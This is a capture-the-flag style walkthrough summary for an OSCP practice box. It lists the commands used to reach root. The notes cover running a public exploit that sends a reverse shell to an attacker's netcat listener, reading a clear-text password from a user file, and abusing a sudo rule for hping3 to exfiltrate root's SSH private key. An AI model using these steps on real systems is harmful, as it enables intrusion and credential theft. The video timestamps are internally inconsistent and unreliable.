This is a comprehensive breakdown of the ICMP box walkthrough, providing notes and the essential commands for your OSCP preparation.

## ICMP Box Walkthrough Notes & Commands (PG-Play) 💻

This walkthrough covers the path from initial port scanning to gaining root privileges, highlighting critical steps like version exploitation, exploit modification, and abusing `sudo` permissions with a network tool.

***

### 1. Information Gathering & Initial Enumeration

The initial step is a thorough port scan followed by web enumeration to identify potential entry points.

#### Key Commands

| Stage | Command | Purpose | Timestamp |
| :--- | :--- | :--- | :--- |
| **Port Scan** | `nmap -p- -sV -sT <TARGET_IP> --open` | Performs a TCP connect scan (`-sT`), checks all ports (`-p-`), detects service versions (`-sV`), and only reports open ports (`--open`) to speed up the scan. | [[31:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=1860)] |
| **Directory Fuzzing** | `wfuzz -c -z file,<wordlist> --hc 404 <URL>/FUZZ` | Fuzzes for files, suppressing 404 errors (`--hc 404`). | [[06:39:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=23940)] |
| **Directory Fuzzing** | `wfuzz -c -z file,<wordlist> --hc 404 <URL>/FUZZ/` | Fuzzes for directories, using a **trailing forward slash** on the URL. | [[07:08:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=25680)] |

#### Notes and Key Concepts

* **Open Ports:** The scan reveals **Port 80 (HTTP)** and **Port 22 (SSH)**.
* **Web Application Discovery:** Manual inspection and observation reveals the application **Monitored version 1.7.6** is running [[10:29:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=37740)].
* **Proactive Enumeration:** Check the page source for exposed directories (e.g., `../config`) even before directory fuzzing [[05:20:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=19200)].

***

### 2. Initial Foothold: Remote Code Execution (RCE)

The foothold is gained by exploiting a known vulnerability in the Monitored application.

#### Key Commands

| Stage | Command | Purpose | Timestamp |
| :--- | :--- | :--- | :--- |
| **Exploit Search** | `searchsploit monitor` | Searches the Exploit Database for exploits related to the software. | [[12:21:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=44460)] |
| **Mirror Exploit** | `searchsploit -m <EXPLOIT_PATH>` | Downloads the selected exploit to the current working directory. | [[12:52:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=46320)] |
| **Netcat Listener** | `nc -lvp 9090` | Sets up a listener on the attacking machine on port 9090 to catch the reverse shell. | [[16:27:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=59220)] |
| **Execute Exploit** | `python rce.py <Target URL> <Attacker IP> 9090` | Executes the modified exploit to send a reverse shell payload to the netcat listener. | [[16:17:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=58620)] |
| **Stable Shell** | `python -c 'import pty; pty.spawn("/bin/bash")'` | Spawns a TTY shell using Python. | [[19:47:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=71220)] |
| **Stable Shell** | `stty raw -echo; fg` | Commands to finalize a stable shell, allowing use of `Ctrl+C` without killing the session. | [[20:14:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=72840)] |

#### Notes and Key Concepts

* **Exploit Modification is Critical:** Always read and modify exploit code before running it. The exploit failed initially because:
    1.  The base URL needed to be changed from `/` to the application's root: `/mon/`.
    2.  There was an unnecessary trailing forward slash causing a double slash (`//`) in the final path [[15:52:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=57120)], [[18:17:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=65820)].
* **The Content Type Header** was abused to inject PHP code, which then executes a reverse shell command upon a file upload attempt [[13:57:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=50220)].

***

### 3. Local Privilege Escalation (User `fox`)

The first privilege escalation is to gain access as a legitimate system user, `fox`.

#### Key Commands

| Stage | Command | Purpose | Timestamp |
| :--- | :--- | :--- | :--- |
| **User Discovery** | `ls -l /home` | Enumerates existing system users. | [[23:09:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=83340)] |
| **File Enumeration** | `cat /home/fox/reminder` | Reads the contents of a suspicious file in the user's home directory. | [[23:51:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=85860)] |
| **File Access** | `cat /home/fox/devel/crypt.php` | Accesses the file mentioned in the reminder (even when a directory is initially restricted, knowing the full path can sometimes bypass restrictions like ACLs). | [31:01:00] |
| **Switch User** | `su fox` **or** `ssh fox@<Target IP>` | Switches to the `fox` user using the discovered password. | [32:21:00], [33:17:00] |

#### Notes and Key Concepts

* **Custom Content is Gold:** The **password** for user `fox` (`FoxThisMaybe`) was found by examining a **custom file (`crypt.php`)** in the user's home directory, which contained the clear-text password inside a PHP `crypt()` function call [31:12:00].
* **SSH Access:** Once the password is known, it's best practice to establish a proper SSH connection for a fully stable and comfortable shell [33:17:00].

***

### 4. Privilege Escalation to Root

The final stage abuses a high-privilege `sudo` permission to exfiltrate the root user's SSH key.

#### Key Commands

| Stage | Command | Purpose | Timestamp |
| :--- | :--- | :--- | :--- |
| **Sudo Check** | `sudo -l` | Checks what commands the current user (`fox`) can run as other users (especially `root`) without needing a password. | [34:23:00] |
| **hping3 Listener** | `sudo hping3 --icmp 127.0.0.1 --listen --safe` | **(Target Session 1)** Runs `hping3` as root to listen for ICMP packets on the loopback interface (`127.0.0.1`). | [40:08:00] |
| **hping3 Sender** | `sudo hping3 --icmp 127.0.0.1 --file /root/.ssh/id_rsa -c 100` | **(Target Session 2)** Runs `hping3` as root to read the root private key (`id_rsa`) and send it over ICMP packets to the local listener. | [41:08:00] |
| **Key Permissions** | `chmod 600 id_rsa` | Sets the correct, secure permissions for the private key on the attacking machine. | [43:57:00] |
| **Final Access** | `ssh -i id_rsa root@<TARGET_IP>` | Logs in as the **root** user using the stolen private key. | [43:29:00] |

#### Notes and Key Concepts

* **Sudo Misconfiguration:** The key to root access is the misconfiguration allowing user `fox` to run **`/usr/sbin/hping3 --icmp *`** as root without a password [34:58:00].
* **Abusing Network Tools:** The powerful `hping3` tool can be used to transfer files via ICMP packets (the "ping" protocol) [38:36:00].
* **The Goal:** The ultimate objective of this technique is to retrieve the root user's SSH private key (`/root/.ssh/id_rsa`) because it allows full, unrestricted access [39:09:00].

***

## OSCP Takeaways

1.  **Always Check Service and Application Versions:** A version number (like Monitored 1.7.6) is often the fastest path to a known exploit and initial access [46:58:00].
2.  **Verify Exploit Code:** Exploits are often unverified. Expect to spend time reading, debugging, and modifying code (especially URLs and paths) to make it work for your target [[15:27:00](http://www.youtube.com/watch?v=6fyL_fFyV4c&t=55620)].
3.  **Know Your Shells:** Always aim to get a **stable shell** (using `python pty`, `stty`, and `fg`) to prevent session termination when running commands or using `Ctrl+C` [46:32:00].
4.  **Master `sudo -l`:** The `sudo -l` command is the most important step in Linux Privilege Escalation. Misconfigurations often allow a user to run powerful commands (like `hping3`, `find`, or `nmap`) as root, which can then be abused for a shell or file exfiltration [34:23:00].

The video is available here: [ICMP Box Walkthrough with S1REN! (PG-Play)](http://www.youtube.com/watch?v=6fyL_fFyV4c)
http://googleusercontent.com/youtube_content/0